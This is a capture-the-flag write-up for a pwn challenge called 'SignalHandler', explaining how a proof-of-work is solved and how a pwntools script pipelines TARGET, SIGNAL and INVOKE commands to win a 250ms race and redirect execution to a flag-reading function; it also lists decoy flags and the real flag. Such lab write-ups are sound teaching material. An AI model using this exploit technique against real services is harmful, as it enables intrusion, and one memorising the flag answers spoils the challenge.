---
title: "SignalHandler"
ctf: "Kosovo Cyber CTF"
date: 2026-06-17
category: pwn
difficulty: medium
points: ~
flag_format: "KOS{...}"
author: "ylbadev"
---

# SignalHandler

## Summary

A pwn challenge with a signal-based state machine. The binary has a `win_flag()` function that reads `/flag`, reachable by setting a stash pointer via `TARGET`, promoting it via `SIGNAL` (SIGUSR1 handler), and invoking it within 250ms via `INVOKE`. Six decoy flags are hardcoded in the binary. The exploit pipelines all three commands to reliably win the race.

## Solution

### Step 1: Solve proof-of-work

```python
import hashlib

def solve_pow(session):
    i = 0
    while True:
        h = hashlib.sha256((session + f'{i:x}').encode()).digest()
        if h[0] == h[1] == h[2] == 0:
            return f'{i:x}'
        i += 1
```

### Step 2: Pipeline TARGET → SIGNAL → INVOKE

```python
from pwn import *
import hashlib

r = remote('ctf.kosovacyber.team', 2009)

banner = r.recvuntil(b'stash is reset.\n')
session = next(l.split(b'=')[1].decode() for l in banner.split(b'\n') if b'session=' in l)

def solve_pow(s):
    i = 0
    while True:
        h = hashlib.sha256((s + f'{i:x}').encode()).digest()
        if h[0] == h[1] == h[2] == 0:
            return f'{i:x}'
        i += 1

r.sendline(f'POW {solve_pow(session)}'.encode())
r.recvline()  # "accepted"

r.sendline(b'LOGIN')
r.recvline()

win_flag = 0x401266  # no PIE
# Pipeline so INVOKE arrives well within the 250ms window
r.send(f'TARGET {win_flag:x}\nSIGNAL\nINVOKE\n'.encode())

print(r.recvall(timeout=6).decode())
```

The decoys (`SIGKILL_ADMIN_HANDSHAKE`, `WATCHDOG_DISABLED_WITH_ALARM0`, `SIGMASK_PRIVILEGE_ESCALATION`, `BE956A2717EB19F5611A07765EE8F2C4`, `PRIVILEGE_BIT_GRANTED`, `SIGNAL_ADMIN_SESSION_OPEN`) are all hardcoded in the binary — `win_flag()` reads the actual `/flag` file.

## Flag

```
KOS{DAF17495D77E42148313EB9E4ACBA1F8}
```
